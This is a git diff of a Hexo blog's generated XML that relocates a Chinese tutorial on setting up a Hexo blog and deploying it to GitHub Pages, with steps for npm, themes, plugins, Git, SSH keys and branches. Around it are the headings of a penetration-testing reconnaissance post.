-<p>缩写：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line"><span class="comment"># 组合</span></span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
-
-<p>到这里本地的博客已经有了初步的原型，先访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看下效果，后面继续。</p>
-<p>Hexo 的命令可以通过 <code>hexo help</code> 和 <code>hexo help [command]</code> 查看帮助，更多请参考 <a href="https://hexo.io/docs/commands.html" target="_blank" rel="noopener">Hexo Commands</a>。</p>
-<h2 id="hexo-主题"><a href="#hexo-主题" class="headerlink" title="hexo 主题"></a>hexo 主题</h2><p>hexo 的默认主题不太喜欢，可以在 <a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">Hexo Themes</a> 选一款自己喜欢的主题，我用过很多主题，<code>next</code>、<code>3-hexo</code>、<code>yilia</code>，最终我还是觉得 <a href="https://github.com/probberechts/cactus-dark" target="_blank" rel="noopener">Cactus Dark</a> 更简单、更友好。</p>
-<p>在 Github 下载主题文件，将文件整个目录 <code>cactus-dark</code> 复制到本地项目的 <code>themes</code> 目录下，然后修改配置文件 <code>_config.yml</code>：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 站点根目录配置文件</span><br><span class="line">theme: cactus-dark</span><br></pre></td></tr></table></figure>
-
-<p>主题相关的配置在 <code>themes/cactus-dark/_config.yml</code> 里面，可以设置链接、添加菜单等，根据自己的需要配置。</p>
-<h2 id="hexo-插件"><a href="#hexo-插件" class="headerlink" title="hexo 插件"></a>hexo 插件</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p><a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">hexo-asset-image</a> 能帮助你更好地管理博客中所用到的图片，每篇博文都会生成一个单独的资源文件夹，而不是混在一起。安装命令是：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>
-
-<p>并且需要在根 <code>_config.yml</code> 里设置 <code>post_asset_folder: true</code>。</p>
-<p>安装完成后用 Hexo 新建文章时会在文章同目录下 <code>source/_posts</code> 生成一个和文章同名的文件夹，文章相关的所有图片放这个文件夹里就行，例如：</p>
-<p>在文章中插入图片时链接只要写图片名称就可以，比如要插入 <code>logo.jpg</code> ，只要写成 <code>![logo](logo.jpg)</code>。</p>
-<h3 id="RSS"><a href="#RSS" class="headerlink" title="RSS"></a>RSS</h3><p><a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 可生成 <code>atom.xml</code> 文件供订阅使用，安装命令是：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure>
-
-<p>在 <code>_config.yml</code> 中配置以下内容：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feed:</span><br><span class="line">  type: atom</span><br><span class="line">  path: atom.xml</span><br><span class="line">  limit: 20</span><br><span class="line">  hub:</span><br><span class="line">  content:</span><br></pre></td></tr></table></figure>
-
-<p>然后将 <code>/atom.xml</code> 链接添加到 <code>themes/cactus-dark/_config.yml</code> 中设置RSS的位置。</p>
-<h3 id="Sitemap"><a href="#Sitemap" class="headerlink" title="Sitemap"></a>Sitemap</h3><p>Sitemap 可方便搜索引擎抓取网页，安装 <a href="https://github.com/hexojs/hexo-generator-sitemap" target="_blank" rel="noopener">hexo-generator-sitemap</a> 即可自动生成 sitemap.xml 文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>
-
-<p>站内搜索</p>
-<p>首先安装 <a href="https://www.npmjs.com/package/hexo-generator-search" target="_blank" rel="noopener">hexo-generate-search</a> 插件，它会生成一个搜索索引文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>
-
-<p>接下来，创建一个页面来显示搜索引擎：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new page search</span><br></pre></td></tr></table></figure>
-
-<p>并将 <code>search: true</code> 放入 <a href="https://hexo.io/zh-cn/docs/front-matter.html" target="_blank" rel="noopener">Front-matter</a> ，也就是 <code>.md</code> 文件最上方以 <code>---</code> 分隔的区域。</p>
-<p>最后编辑 <code>_config.yml</code> 并在导航菜单上添加一个搜索链接。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nav:</span><br><span class="line">  search: &#x2F;search&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>更多 Hexo 插件请参考 <a href="https://hexo.io/plugins/" target="_blank" rel="noopener">Hexo Plugins</a></p>
-<h2 id="发布到-GitHub"><a href="#发布到-GitHub" class="headerlink" title="发布到 GitHub"></a>发布到 GitHub</h2><p>至此本地的博客已经搭建起来了，下一步就是要发布到 Github。</p>
-<p>发布到 Github 前首先要配置 Git 用户信息和在 Github 上加入 SSH key ，如果之前在 Github 上提交过项目或者配置过这两项则可以忽略。</p>
-<h3 id="Git-用户信息"><a href="#Git-用户信息" class="headerlink" title="Git 用户信息"></a>Git 用户信息</h3><p>首先要配置的是你个人的用户名称和电子邮件地址。这两条配置很重要，每次 Git 提交时都会引用这两条信息，说明是谁提交了更新，所以会随更新内容一起被永久纳入历史记录：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name mysecroad <span class="comment"># github名</span></span><br><span class="line">$ git config --global user.email l13273816330@163.com</span><br></pre></td></tr></table></figure>
-
-<p>如果用了 <code>--global</code> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。如果要在某个特定的项目中使用其他名字或者电邮，只要去掉 <code>--global</code> 选项重新配置即可，新的设定保存在当前项目的 <code>.git/config</code> 文件里。</p>
-<h3 id="在-Github-添加-SSH-key"><a href="#在-Github-添加-SSH-key" class="headerlink" title="在 Github 添加 SSH key"></a>在 Github 添加 SSH key</h3><p>使用 SSH key 可以连接到 GitHub ，而无需在每次访问时提供用户名或密码，方便 Git 提交代码到 Github 。所以必须提供 SSH key 用于授权。生成 SSH key 的命令是（Linux/Mac 在终端输入，Windows 在 Git Bash 输入）：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa <span class="comment"># 指定 rsa 算法生成密钥</span></span><br></pre></td></tr></table></figure>
-
-<p>接着连续三个回车键（不需要输入密码），然后就会生成两个文件 <code>id_rsa</code> 和 <code>id_rsa.pub</code> ，id_rsa 是密钥，id_rsa.pub 是公钥。这两个文件在 Linux/Mac 系统是在 <code>~/.ssh</code> 下，Windows 系统在 <code>C:/Users/username/.ssh</code> 下。</p>
-<p>接下来要把 id_rsa.pub 的内容添加到 GitHub 上，这样你本地的 id_rsa 密钥跟 Github 上的 id_rsa.pub 公钥进行配对，授权成功才可以提交代码。</p>
-<p>打开 Github 的 Setting 页面，点击左侧的 SSH and GPG keys：</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cssh_key.png" alt></p>
-<p>然后点击页面右上角的 New SSH key 按钮：</p>
-<p><img src="/posts/28047/new_ssh.png" alt></p>
-<p>在 Key 那栏把 <code>id_rsa.pub</code> 文件里的内容复制粘贴进去就可以了，<code>Title</code> 不需要填写，点击 Add SSH key 按钮就 ok 了。</p>
-<p>SSH key 添加成功后，输入 <code>ssh -T git@github.com</code> 进行测试，如果出现以下提示就证明添加成功了。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi mysecroad! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h3><p>在 Github 上<a href="https://github.com/new" target="_blank" rel="noopener">新建</a>一个名为 <code>username</code>.github.io 的 repository ， username 是你的 Github 账号，比如我的叫 mysecroad.github.io 。然后修改配置文件 <code>_config.yml</code> 里的以下内容：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># url 就是刚才新建的 repository 的名称</span><br><span class="line"># repo 是刚才新建的 repository 的 SSH url</span><br><span class="line">url: https:&#x2F;&#x2F;mysecroad.github.io</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:mysecroad&#x2F;mysecroad.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-
-<p>经过前面的更改主题、安装插件等一系列配置之后，静态文件需要重新生成：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo clean # 清除 public 文件夹中的静态文件</span><br><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
-
-<p>访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看效果，确认页面无误后执行下列命令将静态文件发布到 Github:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy ==&gt; hexo d</span><br></pre></td></tr></table></figure>
-
-<p>到这里博客就完全搭建起来了，访问 <a href="https://mysecroad.github.io/">https://mysecroad.github.io</a> 就可以看到博客了。</p>
-<h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><p>正式发表博客前可以先打个草稿：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new draft <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hello-world 的草稿</span></span><br></pre></td></tr></table></figure>
-
-<p>执行此命令后，会在 <code>source/_drafts</code> 目录下生成一个 <code>hello-world.md</code> 文件，然后用文本编辑器打开 <code>hello-world.md</code> 就可以编辑博文了，使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写。</p>
-<p>新建草稿时标题建议使用英文单词之间加横杠的这种形式，例如 “hello-world” ，而不要使用中文，因为默认会使用文件名作为文章的 url，真正的标题可以在 <code>hello-world.md</code> 文件里面设置。</p>
-<p>默认情况下，草稿不显示。可以在运行 Hexo 时添加 <code>--draft</code> 选项：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server --draft <span class="comment"># 启动服务并预览草稿</span></span><br><span class="line">$ hexo publish <span class="string">"hello-world"</span> <span class="comment"># 发布草稿，会把草稿移到 source/_posts 目录下</span></span><br><span class="line">$ hexo deploy --generate <span class="comment"># 生成静态文件并发布到 Github</span></span><br></pre></td></tr></table></figure>
-
-<p>也可以不打草稿：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new post <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hellow-world 的博文</span></span><br></pre></td></tr></table></figure>
-
-<p>这个命令会在 <code>source/_posts</code> 目录下生成一个 <code>hello-world.md</code> 文件，同样使用文本编辑器编辑这个文件。博文写完预览后直接发布到 Github：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
-
-<p>更多请参考 <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Hexo Writing</a>。</p>
-<h2 id="源文件管理"><a href="#源文件管理" class="headerlink" title="源文件管理"></a>源文件管理</h2><p>如果要用另一台电脑写博客怎么办呢，这里介绍一种方法就是使用 Git 分支，创建两个分支，一个分支用来放博客的原始文件，另一个分支用来放生成的静态文件。</p>
-<h3 id="提交源文件到分支"><a href="#提交源文件到分支" class="headerlink" title="提交源文件到分支"></a>提交源文件到分支</h3><p>先删除 <code>themes</code> 文件夹下的 <code>.git</code> 文件。然后在 <code>_config.yml</code> 中的 <code>deploy</code> 参数下设置 <code>branch: master</code> ，如果前面已经设置过就不用改了，这一步是为了确认将静态文件提交到 <code>master</code> 分支：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lihthub&#x2F;lihthub.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-
-<p>接着在本地博客文件夹下依次执行下列命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git init <span class="comment"># 初始化 Git 项目</span></span><br><span class="line">$ git checkout -b develop <span class="comment"># 新建并切换到 develop 分支</span></span><br><span class="line"><span class="comment"># 添加远程仓库 origin ，后面是你在 Github 上创建的 repository 的 url</span></span><br><span class="line">$ git remote add origin git@github.com:lihthub/lihthub.github.io.git</span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有文件加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
-
-<p>需要注意的是本地博客文件夹根目录下的 <code>.gitignore</code> 是 Hexo 自带的文件，也要提交到仓库，里面列的是要被 Git 忽略的文件，这些文件不需要纳入 Git 的管理。</p>
-<p>这样就把本地博客项目提交到你的 Github 中 <code>mysecroad.github.io</code> 仓库的 <code>develop</code> 分支上了。然后将仓库的默认分支设置为 <code>develop</code>，因为 <code>develop</code> 分支需要手动管理。</p>
-<p>在 Github 中打开 <code>mysecorad.github.io</code> 仓库的主页面，点击上面的 2 branches:</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cgithub.io.png" alt></p>
-<p>然后点击页面右上角的 Change default branch 按钮:</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cchange_brance.png" alt></p>
-<p>然后按下图所示依次点击将 Default branch 设为 <code>develop</code>:</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cdefult.png" alt></p>
-<p>每次更新完博客或者更改了源文件都要执行下列命令提交更新：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status <span class="comment"># 检查文件状态</span></span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有更新加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="换台电脑写博客"><a href="#换台电脑写博客" class="headerlink" title="换台电脑写博客"></a>换台电脑写博客</h3><p>首先需要在新电脑上将远程仓库克隆下来：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:mysecroad/mysecroad.github.io.git</span><br></pre></td></tr></table></figure>
-
-<p>输入 <code>git branch</code> 确认一下当前分支是否为 develop 。然后安装 Node.js 和 Git 。接着执行以下命令安装 Hexo：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
-
-<p>装好 Hexo 后，进入 <code>mysecroad.github.io</code> 目录，安装所需要的 Hexo 插件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mysecroad.github.io</span><br><span class="line">$ npm install</span><br><span class="line">$ npm install hexo-asset-image --save <span class="comment"># 图片管理</span></span><br><span class="line">$ npm install hexo-generator-feed --save <span class="comment"># RSS订阅</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save <span class="comment"># 生成 sitemap.xml</span></span><br><span class="line">$ npm install hexo-deployer-git --save <span class="comment"># Git部署</span></span><br><span class="line">$ npm install hexo-generator-search --save <span class="comment"># 站内搜索</span></span><br></pre></td></tr></table></figure>
-
-<p>按前面的步骤配置好 Git 用户信息和在 Github 上加入 SSH key 后新电脑的环境就搭建好了，就可以写博客了。</p>
-]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>内网信息收集</title>
     <url>/posts/12754.html</url>
     <content><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>首先需要对当前所处的网络环境进行判断。判断涉及三个方面：</p>
@@ -4010,6 +3870,146 @@ string substr(string, start, length)
 <h3 id="利用telnet命令进行扫描"><a href="#利用telnet命令进行扫描" class="headerlink" title="利用telnet命令进行扫描"></a>利用telnet命令进行扫描</h3>]]></content>
       <tags>
         <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用 hexo 搭建个人博客</title>
+    <url>/posts/28047.html</url>
+    <content><![CDATA[<p>一直想搭建一个个人博客，用来记录平时的学习心得。我也用过很多博客，想CSDN、博客园、简书等，但最终还是选择了<code>hexo</code>，这是完全属于我自己的一方净土。</p>
+<h2 id="什么是-hexo-？"><a href="#什么是-hexo-？" class="headerlink" title="什么是 hexo ？"></a>什么是 hexo ？</h2><p><a href="https://hexo.io/" target="_blank" rel="noopener">hexo</a>是个静态博客框架。使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写好文章，Hexo 会转成静态网页部署到 <a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a>。</p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装-Node-js-和-Git"><a href="#安装-Node-js-和-Git" class="headerlink" title="安装 Node.js 和 Git"></a>安装 Node.js 和 Git</h3><p>在安装 Hexo 之前，首先要安装 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> 和 <a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>， Node.js 和 Git 的安装比较简单，请自行查看官方文档，这里不再赘述。</p>
+<p>安装好 Node.js 和 Git 后，用 <a href="https://npmjs.org/" target="_blank" rel="noopener">npm</a> 安装 Hexo ， npm 是 Node.js 的 package manager，会随 Node.js 一同安装。由于墙的关系，建议 npm 换成国内的源，比如<a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝 NPM 镜像</a>。推荐安装 <a href="https://github.com/Pana/nrm" target="_blank" rel="noopener">nrm</a> (NPM registry manager)，可以在不同的 registry 之间快速切换：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g nrm <span class="comment"># 安装 nrm</span></span><br><span class="line">$ nrm ls <span class="comment"># registry 列表</span></span><br><span class="line">$ nrm use taobao  <span class="comment"># 将 registry 切换为 taobao</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h3><p>接着使用 npm 安装 hexo：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
+
+<h2 id="创建-Hexo-项目"><a href="#创建-Hexo-项目" class="headerlink" title="创建 Hexo 项目"></a>创建 Hexo 项目</h2><p>安装好 Hexo 后，在本地新建个文件夹作为 Hexo 项目文件夹，名称随意，我的叫 <code>lihthub.github.io</code> ，执行下列命令，Hexo 会在指定文件夹 <code>lihthub.github.io</code> 中新建所需要的文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init lihthub.github.io <span class="comment"># 初始化 Hexo 项目</span></span><br><span class="line">$ <span class="built_in">cd</span> lihthub.github.io</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>
+
+<p>初始化后，会在文件夹 <code>lihthub.github.io</code> 里生成以下目录结构，这就是你的 Workspace：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml <span class="comment"># 配置文件</span></span><br><span class="line">├── package.json <span class="comment"># 项目所需模块项目的配置信息</span></span><br><span class="line">├── scaffolds <span class="comment"># 用命令生成文章等的模板</span></span><br><span class="line">├── <span class="built_in">source</span> <span class="comment"># 源文件夹，这里放置网站内容</span></span><br><span class="line">|   ├── _drafts <span class="comment"># 放置草稿 markdown 文件</span></span><br><span class="line">|   └── _posts <span class="comment"># 放置博文 markdown 文件</span></span><br><span class="line">└── themes <span class="comment"># 主题文件夹，Hexo 通过将网站内容与主题相结合来生成一个静态网站</span></span><br></pre></td></tr></table></figure>
+
+<p>在 <code>_config.yml</code> 配置文件中填写你的网站的 <code>title</code>、<code>description</code>、<code>author</code> 。更多配置请参考 <a href="https://hexo.io/docs/configuration.html" target="_blank" rel="noopener">Hexo Configuration</a>。</p>
+<p>接着执行下列命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
+
+<p>缩写：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line"><span class="comment"># 组合</span></span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
+
+<p>到这里本地的博客已经有了初步的原型，先访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看下效果，后面继续。</p>
+<p>Hexo 的命令可以通过 <code>hexo help</code> 和 <code>hexo help [command]</code> 查看帮助，更多请参考 <a href="https://hexo.io/docs/commands.html" target="_blank" rel="noopener">Hexo Commands</a>。</p>
+<h2 id="hexo-主题"><a href="#hexo-主题" class="headerlink" title="hexo 主题"></a>hexo 主题</h2><p>hexo 的默认主题不太喜欢，可以在 <a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">Hexo Themes</a> 选一款自己喜欢的主题，我用过很多主题，<code>next</code>、<code>3-hexo</code>、<code>yilia</code>，最终我还是觉得 <a href="https://github.com/probberechts/cactus-dark" target="_blank" rel="noopener">Cactus Dark</a> 更简单、更友好。</p>
+<p>在 Github 下载主题文件，将文件整个目录 <code>cactus-dark</code> 复制到本地项目的 <code>themes</code> 目录下，然后修改配置文件 <code>_config.yml</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 站点根目录配置文件</span><br><span class="line">theme: cactus-dark</span><br></pre></td></tr></table></figure>
+
+<p>主题相关的配置在 <code>themes/cactus-dark/_config.yml</code> 里面，可以设置链接、添加菜单等，根据自己的需要配置。</p>
+<h2 id="hexo-插件"><a href="#hexo-插件" class="headerlink" title="hexo 插件"></a>hexo 插件</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p><a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">hexo-asset-image</a> 能帮助你更好地管理博客中所用到的图片，每篇博文都会生成一个单独的资源文件夹，而不是混在一起。安装命令是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>
+
+<p>并且需要在根 <code>_config.yml</code> 里设置 <code>post_asset_folder: true</code>。</p>
+<p>安装完成后用 Hexo 新建文章时会在文章同目录下 <code>source/_posts</code> 生成一个和文章同名的文件夹，文章相关的所有图片放这个文件夹里就行，例如：</p>
+<p>在文章中插入图片时链接只要写图片名称就可以，比如要插入 <code>logo.jpg</code> ，只要写成 <code>![logo](logo.jpg)</code>。</p>
+<h3 id="RSS"><a href="#RSS" class="headerlink" title="RSS"></a>RSS</h3><p><a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 可生成 <code>atom.xml</code> 文件供订阅使用，安装命令是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>_config.yml</code> 中配置以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feed:</span><br><span class="line">  type: atom</span><br><span class="line">  path: atom.xml</span><br><span class="line">  limit: 20</span><br><span class="line">  hub:</span><br><span class="line">  content:</span><br></pre></td></tr></table></figure>
+
+<p>然后将 <code>/atom.xml</code> 链接添加到 <code>themes/cactus-dark/_config.yml</code> 中设置RSS的位置。</p>
+<h3 id="Sitemap"><a href="#Sitemap" class="headerlink" title="Sitemap"></a>Sitemap</h3><p>Sitemap 可方便搜索引擎抓取网页，安装 <a href="https://github.com/hexojs/hexo-generator-sitemap" target="_blank" rel="noopener">hexo-generator-sitemap</a> 即可自动生成 sitemap.xml 文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>
+
+<p>站内搜索</p>
+<p>首先安装 <a href="https://www.npmjs.com/package/hexo-generator-search" target="_blank" rel="noopener">hexo-generate-search</a> 插件，它会生成一个搜索索引文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>
+
+<p>接下来，创建一个页面来显示搜索引擎：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new page search</span><br></pre></td></tr></table></figure>
+
+<p>并将 <code>search: true</code> 放入 <a href="https://hexo.io/zh-cn/docs/front-matter.html" target="_blank" rel="noopener">Front-matter</a> ，也就是 <code>.md</code> 文件最上方以 <code>---</code> 分隔的区域。</p>
+<p>最后编辑 <code>_config.yml</code> 并在导航菜单上添加一个搜索链接。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nav:</span><br><span class="line">  search: &#x2F;search&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>更多 Hexo 插件请参考 <a href="https://hexo.io/plugins/" target="_blank" rel="noopener">Hexo Plugins</a></p>
+<h2 id="发布到-GitHub"><a href="#发布到-GitHub" class="headerlink" title="发布到 GitHub"></a>发布到 GitHub</h2><p>至此本地的博客已经搭建起来了，下一步就是要发布到 Github。</p>
+<p>发布到 Github 前首先要配置 Git 用户信息和在 Github 上加入 SSH key ，如果之前在 Github 上提交过项目或者配置过这两项则可以忽略。</p>
+<h3 id="Git-用户信息"><a href="#Git-用户信息" class="headerlink" title="Git 用户信息"></a>Git 用户信息</h3><p>首先要配置的是你个人的用户名称和电子邮件地址。这两条配置很重要，每次 Git 提交时都会引用这两条信息，说明是谁提交了更新，所以会随更新内容一起被永久纳入历史记录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name mysecroad <span class="comment"># github名</span></span><br><span class="line">$ git config --global user.email l13273816330@163.com</span><br></pre></td></tr></table></figure>
+
+<p>如果用了 <code>--global</code> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。如果要在某个特定的项目中使用其他名字或者电邮，只要去掉 <code>--global</code> 选项重新配置即可，新的设定保存在当前项目的 <code>.git/config</code> 文件里。</p>
+<h3 id="在-Github-添加-SSH-key"><a href="#在-Github-添加-SSH-key" class="headerlink" title="在 Github 添加 SSH key"></a>在 Github 添加 SSH key</h3><p>使用 SSH key 可以连接到 GitHub ，而无需在每次访问时提供用户名或密码，方便 Git 提交代码到 Github 。所以必须提供 SSH key 用于授权。生成 SSH key 的命令是（Linux/Mac 在终端输入，Windows 在 Git Bash 输入）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa <span class="comment"># 指定 rsa 算法生成密钥</span></span><br></pre></td></tr></table></figure>
+
+<p>接着连续三个回车键（不需要输入密码），然后就会生成两个文件 <code>id_rsa</code> 和 <code>id_rsa.pub</code> ，id_rsa 是密钥，id_rsa.pub 是公钥。这两个文件在 Linux/Mac 系统是在 <code>~/.ssh</code> 下，Windows 系统在 <code>C:/Users/username/.ssh</code> 下。</p>
+<p>接下来要把 id_rsa.pub 的内容添加到 GitHub 上，这样你本地的 id_rsa 密钥跟 Github 上的 id_rsa.pub 公钥进行配对，授权成功才可以提交代码。</p>
+<p>打开 Github 的 Setting 页面，点击左侧的 SSH and GPG keys：</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cssh_key.png" alt></p>
+<p>然后点击页面右上角的 New SSH key 按钮：</p>
+<p><img src="/posts/28047/new_ssh.png" alt></p>
+<p>在 Key 那栏把 <code>id_rsa.pub</code> 文件里的内容复制粘贴进去就可以了，<code>Title</code> 不需要填写，点击 Add SSH key 按钮就 ok 了。</p>
+<p>SSH key 添加成功后，输入 <code>ssh -T git@github.com</code> 进行测试，如果出现以下提示就证明添加成功了。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi mysecroad! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure>
+
